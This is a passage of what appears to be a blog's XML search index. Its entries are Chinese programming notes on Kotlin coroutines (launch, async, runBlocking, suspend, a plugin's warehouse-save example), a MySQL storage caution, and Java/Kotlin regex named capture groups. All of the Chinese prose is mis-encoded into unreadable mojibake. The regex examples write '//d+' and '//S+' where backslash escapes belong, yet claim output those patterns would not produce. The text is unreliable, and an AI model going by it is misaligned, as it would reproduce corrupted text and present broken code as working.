è‡ªç”±</strong></p></li><li><blockquote><p>åç¨‹æ˜¯éé˜»å¡å¼çš„(ä¹Ÿæœ‰é˜»å¡API)ï¼Œ<strong>ä¸€ä¸ªåç¨‹åœ¨è¿›å…¥é˜»å¡åä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œå½“å‰çº¿ç¨‹ä¼šå»æ‰§è¡Œå…¶ä»–åç¨‹ä»»åŠ¡</strong></p><p>è¿™å°±å¾ˆèˆ’æœäº†</p></blockquote></li></ul><h2 id="Kotlinä¸­åç¨‹çš„ä½¿ç”¨æ–¹æ³•"><a href="#Kotlinä¸­åç¨‹çš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="Kotlinä¸­åç¨‹çš„ä½¿ç”¨æ–¹æ³•"></a>Kotlinä¸­åç¨‹çš„ä½¿ç”¨æ–¹æ³•</h2><h3 id="ä¾èµ–åº“"><a href="#ä¾èµ–åº“" class="headerlink" title="ä¾èµ–åº“"></a>ä¾èµ–åº“</h3><p>kotlinçš„åç¨‹apiå¹¶ä¸åŒ…å«åœ¨kotlin-stdlibä¸­ï¼Œè·Ÿkotlinçš„åå°„apiä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦è‡ªè¡Œå¯¼å…¥ä¾èµ–</p><p>å…¶å®æœ€æ–°ç‰ˆæœ¬å·²ç»è¿­ä»£åˆ°1.5.1äº†ï¼Œåªæ˜¯æœ€æ–°ç‰ˆæœ¬å¿…é¡»è¦java16æ‰èƒ½å…¼å®¹ï¼Œæ‰€ä»¥ç”¨äº†è€ç‰ˆæœ¬</p><pre class="line-numbers language-none"><code class="language-none">compileOnly("org.jetbrains.kotlinx:kotlinx-coroutines-core:1.3.3")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å¦‚ä½•åˆ›å»ºä¸€ä¸ªåç¨‹"><a href="#å¦‚ä½•åˆ›å»ºä¸€ä¸ªåç¨‹" class="headerlink" title="å¦‚ä½•åˆ›å»ºä¸€ä¸ªåç¨‹"></a>å¦‚ä½•åˆ›å»ºä¸€ä¸ªåç¨‹</h3><p>å¼•ç”¨: <a href="https://www.jianshu.com/p/76d2f47b900d">kotlin - Coroutine åç¨‹ - ç®€ä¹¦ (jianshu.com)</a></p><blockquote><p>kotlin é‡Œæ²¡æœ‰ new ï¼Œè‡ªç„¶ä¹Ÿä¸åƒ JAVA ä¸€æ · new Threadï¼Œå¦å¤– kotlin é‡Œé¢æä¾›äº†å¤§é‡çš„é«˜é˜¶å‡½æ•°ï¼Œæ‰€ä»¥ä¸éš¾çŒœå‡ºåç¨‹è¿™é‡Œ kotlin ä¹Ÿæ˜¯æœ‰æä¾›ä¸“ç”¨å‡½æ•°çš„ã€‚kotlin ä¸­ GlobalScope ç±»æä¾›äº†å‡ ä¸ªæºç¨‹æ„é€ å‡½æ•°ï¼š</p></blockquote><blockquote><ul><li><a href="https://coldrain-moro.github.io/content.html?id=8">launch</a> - åˆ›å»ºåç¨‹</li><li><a href="https://coldrain-moro.github.io/content.html?id=8">async</a> - åˆ›å»ºå¸¦è¿”å›å€¼çš„åç¨‹ï¼Œè¿”å›çš„æ˜¯ Deferred ç±»</li><li><a href="https://coldrain-moro.github.io/content.html?id=8">withContext </a>- ä¸åˆ›å»ºæ–°çš„åç¨‹ï¼Œåœ¨æŒ‡å®šåç¨‹ä¸Šè¿è¡Œä»£ç å—</li><li><a href="https://coldrain-moro.github.io/content.html?id=8">runBlocking</a> - ä¸æ˜¯ GlobalScope çš„ APIï¼Œå¯ä»¥ç‹¬ç«‹ä½¿ç”¨ï¼ŒåŒºåˆ«æ˜¯ runBlocking é‡Œé¢çš„ delay ä¼šé˜»å¡çº¿ç¨‹ï¼Œè€Œ launch åˆ›å»ºçš„ä¸ä¼š</li></ul></blockquote><blockquote><p>kotlin åœ¨ 1.3 ä¹‹åè¦æ±‚åç¨‹å¿…é¡»ç”± CoroutineScope åˆ›å»ºï¼ŒCoroutineScope ä¸é˜»å¡å½“å‰çº¿ç¨‹ï¼Œåœ¨åå°åˆ›å»ºä¸€ä¸ªæ–°åç¨‹ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šåç¨‹è°ƒåº¦å™¨ã€‚æ¯”å¦‚ CoroutineScope.launch{} å¯ä»¥çœ‹æˆ new Coroutine</p></blockquote><h4 id="launch"><a href="#launch" class="headerlink" title="launch"></a>launch</h4><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">GlobalScope<span class="token punctuation">.</span><span class="token function">launch</span> <span class="token punctuation">{</span>    <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æ­¤ä¾¿åˆ›å»ºäº†ä¸€ä¸ªæœ€ç®€å•çš„åç¨‹ï¼Œè¿™ä¸ªåç¨‹æ˜¯åœ¨ä¸»çº¿ç¨‹ä¸Šåˆ›å»ºçš„ï¼Œæ¢å¥è¯è¯´ï¼Œ<strong>æ˜¯åŒæ­¥çš„</strong></p><blockquote><ul><li>CoroutineContext</li></ul></blockquote><blockquote><p>- å¯ä»¥ç†è§£ä¸ºåç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥è®¾ç½® CoroutineDispatcher åç¨‹è¿è¡Œçš„çº¿ç¨‹è°ƒåº¦å™¨ï¼Œæœ‰ 4ç§çº¿ç¨‹æ¨¡å¼ï¼š</p></blockquote><blockquote><ul><li>Dispatchers.Default</li><li>Dispatchers.IO -</li><li>Dispatchers.Main - ä¸»çº¿ç¨‹</li><li>Dispatchers.Unconfined - æ²¡æŒ‡å®šï¼Œå°±æ˜¯åœ¨å½“å‰çº¿ç¨‹</li></ul></blockquote><blockquote><p>ä¸å†™çš„è¯å°±æ˜¯ Dispatchers.Default æ¨¡å¼çš„</p></blockquote><p>å®ƒæœ‰ä¸€ä¸ªè¿”å›å€¼Jobã€‚<strong>å¯ä»¥æŠŠ Job çœ‹æˆåç¨‹å¯¹è±¡æœ¬èº«ï¼Œåç¨‹çš„æ“ä½œæ–¹æ³•éƒ½åœ¨ Job èº«ä¸Šäº†</strong></p><blockquote><p>job.start() - å¯åŠ¨åç¨‹ï¼Œé™¤äº† lazy æ¨¡å¼ï¼Œåç¨‹éƒ½ä¸éœ€è¦æ‰‹åŠ¨å¯åŠ¨</p></blockquote><blockquote><p>job.join() - ç­‰å¾…åç¨‹æ‰§è¡Œå®Œæ¯•</p></blockquote><blockquote><p>job.cancel() - å–æ¶ˆä¸€ä¸ªåç¨‹</p></blockquote><blockquote><p>job.cancelAndJoin() - ç­‰å¾…åç¨‹æ‰§è¡Œå®Œæ¯•ç„¶åå†å–æ¶ˆ</p></blockquote><h4 id="async"><a href="#async" class="headerlink" title="async"></a>async</h4><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">GlobalScope<span class="token punctuation">.</span><span class="token function">async</span> <span class="token punctuation">{</span>    <span class="token comment">// åœ¨å¼‚æ­¥çº¿ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªåç¨‹</span>    <span class="token comment">// å µå¡åç¨‹1s ï¼ˆå³æŒ‚èµ·åç¨‹ï¼‰</span>    <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000L</span><span class="token punctuation">)</span>    <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"123"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token function">invokeOnCompletion</span> <span class="token punctuation">{</span>    <span class="token comment">// å®Œæˆåæ‰§è¡Œ(åŒæ­¥)</span>    <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"456"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªæ–¹æ³•æ˜¯åœ¨å¼‚æ­¥çº¿ç¨‹ä¸­åˆ›å»ºåç¨‹ï¼Œä¸åŒäºlaunchè¿”å›Jobï¼Œasyncè¿”å›çš„æ˜¯Deferredç±»å‹</p><p>Deferredæ˜¯Jobçš„å­ç±»ï¼ŒåŒ…å«Jobçš„ä¸€åˆ‡æ–¹æ³•ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æ–°æ·»äº†ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„æ–¹æ³• <strong>await</strong></p><p>è¿™ä¸ªæ–¹æ³•ç”¨èµ·æ¥éå¸¸èˆ’æœï¼Œå¤šçº¿ç¨‹æ“ä½œç”¨è¿™ä¸ªæ–¹æ³•å¤„ç†å°±è·Ÿå¤„ç†åŒæ­¥æ“ä½œä¸€æ ·</p><p>ä¾‹å­: (æ‘˜è‡ªç®€ä¹¦)</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">GlobalScope<span class="token punctuation">.</span><span class="token function">launch</span><span class="token punctuation">(</span>Dispatchers<span class="token punctuation">.</span>Unconfined<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">val</span> deferred <span class="token operator">=</span> GlobalScope<span class="token punctuation">.</span><span class="token function">async</span><span class="token punctuation">{</span>  <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000L</span><span class="token punctuation">)</span>  Log<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"This is async "</span><span class="token punctuation">)</span>  <span class="token keyword">return</span><span class="token label symbol">@async</span> <span class="token string">"taonce"</span>  <span class="token punctuation">}</span>  Log<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"åç¨‹ other start"</span><span class="token punctuation">)</span>  <span class="token keyword">val</span> result <span class="token operator">=</span> deferred<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  Log<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"async result is <span class="token interpolation variable">$result</span>"</span><span class="token punctuation">)</span>  Log<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span><span class="token string">"åç¨‹ other end "</span><span class="token punctuation">)</span><span class="token punctuation">}</span>Log<span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"AA"</span><span class="token punctuation">,</span> <span class="token string">"ä¸»çº¿ç¨‹ä½äºåç¨‹ä¹‹åçš„ä»£ç æ‰§è¡Œï¼Œæ—¶é—´:  <span class="token interpolation"><span class="token delimiter variable">${</span>System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter variable">}</span></span>"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="runBlocking"><a href="#runBlocking" class="headerlink" title="runBlocking"></a>runBlocking</h4><p><strong>è¯¥éƒ¨åˆ†å…¨éƒ¨æ‘˜è‡ªç®€ä¹¦</strong></p><p>runBlocking å’Œ launch åŒºåˆ«çš„åœ°æ–¹å°±æ˜¯ runBlocking çš„ delay æ–¹æ³•æ˜¯å¯ä»¥é˜»å¡å½“å‰çš„çº¿ç¨‹çš„ï¼Œå’ŒThread.sleep() ä¸€æ ·ï¼Œçœ‹ä¸‹é¢çš„ä¾‹å­:</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span>args<span class="token operator">:</span> Array<span class="token operator">&lt;</span>String<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  runBlocking <span class="token punctuation">{</span>    <span class="token comment">// é˜»å¡1s</span>    <span class="token function">delay</span><span class="token punctuation">(</span><span class="token number">1000L</span><span class="token punctuation">)</span>    <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"This is a coroutines <span class="token interpolation"><span class="token delimiter variable">${</span>TimeUtil<span class="token punctuation">.</span><span class="token function">getTimeDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter variable">}</span></span>"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token comment">// é˜»å¡2s</span>  Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000L</span><span class="token punctuation">)</span>  <span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"main end <span class="token interpolation"><span class="token delimiter variable">${</span>TimeUtil<span class="token punctuation">.</span><span class="token function">getTimeDetail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter variable">}</span></span>"</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>~~~~~~~~~~~~~~log~~~~~~~~~~~~~~~~This <span class="token keyword">is</span> a coroutines <span class="token number">11</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">51</span>main end <span class="token number">11</span><span class="token operator">:</span><span class="token number">00</span><span class="token operator">:</span><span class="token number">53</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>runBlocking é€šå¸¸çš„ç”¨æ³•æ˜¯ç”¨æ¥æ¡¥æ¥æ™®é€šé˜»å¡ä»£ç å’ŒæŒ‚èµ·é£æ ¼çš„éé˜»å¡ä»£ç ï¼Œåœ¨ runBlocking é—­åŒ…é‡Œé¢å¯åŠ¨å¦å¤–çš„åç¨‹ï¼Œåç¨‹é‡Œé¢æ˜¯å¯ä»¥åµŒå¥—å¯åŠ¨åˆ«çš„åç¨‹çš„ã€‚</p><h3 id="suspend-å…³é”®å­—"><a href="#suspend-å…³é”®å­—" class="headerlink" title="suspend å…³é”®å­—"></a>suspend å…³é”®å­—</h3><p>è¢«ä¿®é¥°çš„å‡½æ•°å¯ä»¥ç§°ä½œ<strong>æŒ‚èµ·å‡½æ•°</strong></p><p><strong>æ²¡ç”¨suspendæ ‡è®°çš„æ–¹æ³•ä¸èƒ½å‚åŠ åç¨‹ä»»åŠ¡ï¼Œsuspendä¿®é¥°çš„æ–¹æ³•åªèƒ½ä¸å¦ä¸€ä¸ªè¢«suspendä¿®é¥°çš„æ–¹æ³•è¿›è¡Œäº¤æµ</strong></p><p><strong>åç¨‹æœ¬èº«ä¹Ÿæ˜¯æŒ‚èµ·å‡½æ•°</strong></p><h2 id="å®é™…è¿ç”¨"><a href="#å®é™…è¿ç”¨" class="headerlink" title="å®é™…è¿ç”¨"></a>å®é™…è¿ç”¨</h2><p>ä»£ç æ¥è‡ªæˆ‘çš„SacredBank</p><p>ä¹‹å‰ç©å®¶ä»“åº“ç¿»é¡µæ—¶æ›´æ–°æ•°æ®åº“å°±æ˜¯å¾ˆæ™®é€šçš„async taskï¼Œè€Œç¿»åˆ°ä¸‹ä¸€é¡µè¿™ä¸ªæ“ä½œæ˜¯åŒæ­¥çš„</p><p>è¿™å¯èƒ½ä¼šå¯¼è‡´ç©å®¶ä»“åº“æ•°æ®å°šæœªåŠæ—¶æ›´æ–°å°±ç¿»åˆ°ä¸‹ä¸€é¡µï¼Œå¯èƒ½ä¼šå‡ºç°ç©å®¶æ‰“å¼€ä»“åº“ä¸­çš„ç‰©å“ä¸æ•°æ®åº“ä¸­å‚¨å­˜çš„ç©å®¶ä»“åº“ç‰©å“ä¸ä¸€è‡´</p><p>è¿ç”¨åç¨‹å·§å¦™çš„è§£å†³äº†è¿™ä¸ªé—®é¢˜</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// è¿”å›ä¸€ä¸ªDefferedå®ä¾‹    </span><span class="token keyword">fun</span> <span class="token function">saveWarehouse</span><span class="token punctuation">(</span><span class="token operator">inv</span><span class="token operator">:</span> Inventory<span class="token punctuation">,</span> holder<span class="token operator">:</span> BankHolder<span class="token punctuation">)</span><span class="token operator">:</span> Deferred<span class="token operator">&lt;</span>Unit<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> GlobalScope<span class="token punctuation">.</span><span class="token function">async</span> <span class="token punctuation">{</span>            <span class="token operator">inv</span><span class="token punctuation">.</span><span class="token function">removeItem</span><span class="token punctuation">(</span>item_previous_page<span class="token punctuation">,</span> item_next_page<span class="token punctuation">,</span> item_current_page<span class="token punctuation">,</span> SacredBank<span class="token punctuation">.</span>lockItem<span class="token punctuation">)</span>            <span class="token keyword">val</span> profile <span class="token operator">=</span> Database<span class="token punctuation">.</span>selectedDB<span class="token punctuation">.</span><span class="token function">select</span><span class="token punctuation">(</span>Bukkit<span class="token punctuation">.</span><span class="token function">getOfflinePlayer</span><span class="token punctuation">(</span>holder<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?:</span> <span class="token function">PlayerProfile</span><span class="token punctuation">(</span>Bukkit<span class="token punctuation">.</span><span class="token function">getOfflinePlayer</span><span class="token punctuation">(</span>holder<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>uniqueId<span class="token punctuation">)</span>            <span class="token operator">inv</span><span class="token punctuation">.</span><span class="token function">forEachIndexed</span> <span class="token punctuation">{</span> i<span class="token punctuation">,</span> item <span class="token operator">-&gt;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">45</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span><span class="token function">isNotAir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> profile<span class="token punctuation">.</span>warehouseItems<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">45</span> <span class="token operator">*</span> <span class="token punctuation">(</span>holder<span class="token punctuation">.</span>warehouse_page <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> item                <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> <span class="token number">45</span> <span class="token operator">&amp;&amp;</span> item<span class="token punctuation">.</span><span class="token function">isAir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> profile<span class="token punctuation">.</span>warehouseItems<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">45</span> <span class="token operator">*</span> <span class="token punctuation">(</span>holder<span class="token punctuation">.</span>warehouse_page <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">}</span>            Database<span class="token punctuation">.</span>selectedDB<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>Bukkit<span class="token punctuation">.</span><span class="token function">getOfflinePlayer</span><span class="token punctuation">(</span>holder<span class="token punctuation">.</span>target<span class="token punctuation">)</span><span class="token punctuation">,</span> profile<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token comment">// ç¿»é¡µæ“ä½œä»£ç ç‰‡æ®µ</span><span class="token comment">// å¯¹Defferedå®ä¾‹è¿›è¡Œæ“ä½œï¼Œä½¿å…¶åœ¨æ•°æ®ä¸Šä¼ å®Œæ¯•åå†è¿›è¡Œç¿»é¡µæ“ä½œ</span>Warehouse<span class="token punctuation">.</span><span class="token function">saveWarehouse</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>inventory<span class="token punctuation">,</span> holder<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invokeOnCompletion</span> <span class="token punctuation">{</span>   Warehouse<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>whoClicked <span class="token keyword">as</span> Player<span class="token punctuation">,</span> holder<span class="token punctuation">.</span><span class="token function">also</span> <span class="token punctuation">{</span>it<span class="token punctuation">.</span>warehouse_page <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Coroutine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åœ¨ä½¿ç”¨SQLæ—¶çš„ä¸€äº›æ³¨æ„äº‹é¡¹</title>
      <link href="/2021/07/22/be-careful-using-mysql/"/>
      <url>/2021/07/22/be-careful-using-mysql/</url>
      
        <content type="html"><![CDATA[<h2 id="å°½é‡é¿å…å°†å¤§é‡æ•°æ®åºåˆ—åŒ–æ‰”ä¸€ä¸ªåˆ—é‡Œ"><a href="#å°½é‡é¿å…å°†å¤§é‡æ•°æ®åºåˆ—åŒ–æ‰”ä¸€ä¸ªåˆ—é‡Œ" class="headerlink" title="å°½é‡é¿å…å°†å¤§é‡æ•°æ®åºåˆ—åŒ–æ‰”ä¸€ä¸ªåˆ—é‡Œ"></a>å°½é‡é¿å…å°†å¤§é‡æ•°æ®åºåˆ—åŒ–æ‰”ä¸€ä¸ªåˆ—é‡Œ</h2><p><strong>å°¤å…¶æ˜¯åœ¨éœ€è¦é¢‘ç¹è·å–/æ›´æ–°è¿™äº›æ•°æ®çš„æƒ…å†µä¸‹</strong><br>è¿™æ ·ä¸€æ—¦æ•°æ®åº“å‚¨é‡åˆ°è¾¾ä¸€å®šçº§åˆ«ï¼Œ<strong>æ•°æ®åº“æå¯èƒ½ä¸¢å¤±æ•°æ®</strong><br>ç¥åŸŸçš„åœ°ç‰¢å­¤å‰‘ä¾¿æ˜¯å‰è½¦ä¹‹é‰´<br><strong>å‚¨å­˜æ–¹å¼</strong></p><p><a href="https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png"><img src="https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png" alt="7e8c1fed3737e6ab"></a></p><p><strong>åæœ</strong></p><p><a href="https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg"><img src="https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg" alt="-2bf7c04dec497124"></a></p><p><a href="https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg"><img src="https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg" alt="-3e6ca3264d9d5b3a"></a></p><p><a href="https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg"><img src="https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg" alt="54e384ac658f35d9"></a></p><p><strong>çŸ¥ä¹</strong><br><a href="https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png"><img src="https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png" alt="1c4ec094fffaaa6a"></a><br><a href="https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png"><img src="https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png" alt="-1edc645b674852e1"></a><br><a href="https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png"><img src="https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png" alt="-5462c585fd3183db"></a></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­£åˆ™è¡¨è¾¾å¼æ•è·ç»„åœ¨Java/Kotlinä¸­çš„ä½¿ç”¨</title>
      <link href="/2021/07/21/regex-matcher/"/>
      <url>/2021/07/21/regex-matcher/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¼ ç»Ÿæ–¹å¼ï¼šä½¿ç”¨æ•è·ç»„åºæ•°æ¥è·å–æ•è·ç»„æ•è·åˆ°çš„å†…å®¹"><a href="#ä¼ ç»Ÿæ–¹å¼ï¼šä½¿ç”¨æ•è·ç»„åºæ•°æ¥è·å–æ•è·ç»„æ•è·åˆ°çš„å†…å®¹" class="headerlink" title="ä¼ ç»Ÿæ–¹å¼ï¼šä½¿ç”¨æ•è·ç»„åºæ•°æ¥è·å–æ•è·ç»„æ•è·åˆ°çš„å†…å®¹"></a>ä¼ ç»Ÿæ–¹å¼ï¼šä½¿ç”¨æ•è·ç»„åºæ•°æ¥è·å–æ•è·ç»„æ•è·åˆ°çš„å†…å®¹</h2><p>ä¸Šä»£ç </p><pre class="line-numbers language-none"><code class="language-none">val pattern = Pattern.compile("(//d+)(//S+)")val matcher = pattern.matcher("2021BifrostCraft")if (matcher.find()) {    print(matcher.group())    print(matcher.group(1))    print(matcher.group(2))}// è¾“å‡ºç»“æœæ˜¯:2021BifrostCraft,2021,BifrostCraft<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æœ‰æ—¶æˆ‘ä»¬ä¸çŸ¥é“Patternä¸­ä¸€å…±æœ‰å¤šå°‘ä¸ªæ•è·ç»„ï¼Œä¹Ÿå°±ä¸çŸ¥é“æˆ‘ä»¬éœ€è¦è·å–çš„æ•è·ç»„çš„åºå·</p><p>è¿™ä¸ªé—®é¢˜ä¸€åº¦å›°æ‰°äº†æˆ‘å¾ˆä¹…</p><p>ç›´åˆ°æˆ‘äº†è§£åˆ°å‘½åæ•è·ç»„è¿™ç§åšæ³•</p><h2 id="å‘½åæ•è·ç»„"><a href="#å‘½åæ•è·ç»„" class="headerlink" title="å‘½åæ•è·ç»„"></a>å‘½åæ•è·ç»„</h2><p><strong>æ¯ä¸ªä»¥å·¦æ‹¬å·å¼€å§‹çš„æ•è·ç»„ï¼Œéƒ½ç´§è·Ÿç€â€œ?â€ï¼Œè€Œåæ‰æ˜¯æ­£åˆ™è¡¨è¾¾å¼ã€‚</strong></p><p>å…ˆä¸Šä»£ç </p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">val</span> pattern <span class="token operator">=</span> Pattern<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"(?&lt;number&gt;//d+)(?&lt;word&gt;//S+)"</span><span class="token punctuation">)</span><span class="token keyword">val</span> matcher <span class="token operator">=</span> pattern<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span><span class="token string">"2021BifrostCraft"</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">print</span><span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token string">"number"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token string">"word"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment">// è¾“å‡ºç»“æœæ˜¯:2021BifrostCraft,2021,BifrostCraft</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·åšï¼Œå³ä½¿æˆ‘ä»¬ä¸çŸ¥é“æˆ‘ä»¬çš„patterné‡Œé¢æœ‰å¤šå°‘æ•è·ç»„ï¼Œä¹Ÿä¸çŸ¥é“æˆ‘ä»¬éœ€è¦çš„æ•è·ç»„çš„åºå·ï¼Œæˆ‘ä»¬ä»ç„¶èƒ½è·å–åˆ°æˆ‘ä»¬æƒ³è¦å¾—åˆ°å¾—æ•è·ç»„çš„å†…å®¹</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨streamå¯¹mapè¿›è¡Œæ“ä½œ</title>
      <link href="/2021/07/21/use-stream-to-handle-map/"/>
      <url>/2021/07/21/use-stream-to-handle-map/</url>
      
